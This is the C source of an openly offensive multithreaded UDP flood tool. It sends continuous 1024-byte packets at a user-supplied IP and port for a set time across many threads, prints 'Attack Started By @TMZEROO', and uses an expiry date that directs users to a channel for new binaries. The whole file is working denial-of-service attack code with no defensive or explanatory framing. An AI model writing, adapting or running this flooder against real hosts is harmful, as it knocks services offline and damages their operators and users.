#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define EXPIRY_DATE 20241110 // Format: YYYYMMDD
#define BUFFER_SIZE 1024

// Function to get the current date in YYYYMMDD format
int get_current_date() {
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    return (tm.tm_year + 1900) * 10000 + (tm.tm_mon + 1) * 100 + tm.tm_mday;
}

// Function to send UDP packets
void *send_udp_traffic(void *args) {
    char **argv = (char **)args;
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    int sockfd;
    struct sockaddr_in target_addr;
    char buffer[BUFFER_SIZE];
    memset(buffer, 0xff, BUFFER_SIZE); // Fill buffer with high-power data

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(ip);

    printf("Attack Started By @TMZEROO\n");

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sendto(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <Port> <Time> <Threads>\n", argv[0]);
        return 1;
    }

    // Check expiration date
    int current_date = get_current_date();
    if (current_date > EXPIRY_DATE) {
        printf("Binary is Expired. Join @creativeydb for new binary\n");
        return 1;
    }

    int threads = atoi(argv[4]);
    pthread_t thread_pool[threads];

    // Create threads to send UDP traffic
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, send_udp_traffic, argv) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    // Wait for all threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    return 0;
}
